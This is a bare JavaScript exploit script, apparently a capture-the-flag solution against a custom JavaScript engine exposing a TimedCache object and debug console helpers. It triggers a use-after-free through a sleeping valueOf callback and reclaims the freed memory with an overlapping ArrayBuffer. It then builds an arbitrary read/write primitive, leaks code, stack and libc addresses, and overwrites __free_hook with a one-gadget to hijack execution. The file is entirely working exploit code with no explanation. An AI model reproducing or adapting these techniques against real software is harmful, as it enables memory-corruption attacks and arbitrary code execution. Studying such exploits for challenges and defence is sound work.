// leak object addr
var arr1 = new ArrayBuffer(0x300);
var arr2 = new ArrayBuffer(0x300);
info_arr1 = console.debug(arr1);
console.log(info_arr1);
var addr_arr1 = BigInt(info_arr1.substring(32, 46)) - 0x28n;
var method_addr_arr1 = BigInt(info_arr1.substring(58, 72));

// trigger the UAF
var overlap;
var fake_expire_time = { 1: 2 };
fake_expire_time.valueOf = function () {
  console.sleep(2000);
  console.collectGarbage();
  overlap = new ArrayBuffer(0x150);
  //{1:{}}                             {1:{}}
  //^    ^  <-- Array Buffer Data         ^^ <-- Array Header
  return -1;
};
var tc = new TimedCache();
tc.set("first", { 1: {} }, 1000);
var info_first = console.debug(tc.get("first"));
console.log(info_first);
var freed_obj = tc.get("first", fake_expire_time);
console.log(console.debug(overlap));

// leak code_addr stack_addr
var view = new DataView(overlap);
var addr_first = BigInt(info_first.substring(32, 46)) - 0x28n;
var method_addr = BigInt(info_first.substring(58, 72));

function set64(view, idx, value) {
  view.setBigUint64(idx, value, true);
}

var leak_addr = addr_first + 0x180n;
set64(view, 0x28, leak_addr + 2n); //addr+2
set64(view, 6 * 8, leak_addr); //addr
set64(view, 7 * 8, 0x300n);
set64(view, 8 * 8, 0x300n);
set64(view, 9 * 8, 0x300n);
set64(view, 10 * 8, 0x301n);
set64(view, 14 * 8, leak_addr); //addr
set64(view, 15 * 8, 0x300n);
set64(view, 16 * 8, 0x300n);
set64(view, 17 * 8, method_addr_arr1); //method
console.log(console.debug(freed_obj));

var view_anywhere = new DataView(freed_obj);

function get64(view, idx) {
  return view.getBigUint64(idx, true);
}

var code_addr = get64(view_anywhere, 0x10) - 0x11c9db0n;
var stack_addr = get64(view_anywhere, 0x60);
var filed2 = get64(view_anywhere, 0x148);
console.log(code_addr);
console.log(stack_addr);

// leak libc from got
set64(view, 0x28, code_addr + 0x01208800n + 2n);
set64(view, 6 * 8, code_addr + 0x01208800n);
var libc_addr = get64(view_anywhere, 0x88) - 0x1880e0n;
console.log(libc_addr);

// restore header
set64(view, 11 * 8, stack_addr + 0xc570n + 0x208n); // 3 stack addr
set64(view, 12 * 8, stack_addr + 0xc570n);
set64(view, 13 * 8, stack_addr + 0xc570n);
set64(view, 19 * 8, code_addr + 0xec5200n);
set64(view, 23 * 8, code_addr + 0xec5200n);
set64(view, 30 * 8, code_addr + 0xec5200n);
set64(view, 36 * 8, method_addr + 0x4ec00n);
set64(view, 38 * 8, code_addr + 0xec5200n);
set64(view, 41 * 8, filed2);

// __free_hook -> onegadget
var free_hook = libc_addr + 0x1eee48n;
// var malloc_hook = libc_addr+ 0x1ecb70n;
// var system = 349200;
set64(view, 0x28, free_hook + 2n - 0x48n);
set64(view, 6 * 8, free_hook - 0x48n);
set64(view_anywhere, 0x48, libc_addr + 0xe3cf3n); //onegadget 0xe3cf3 0xe3cf6 0xe3cf9
//console.collectGarbage();
//console.exit(0);
//.exit
//console.sysbreak();
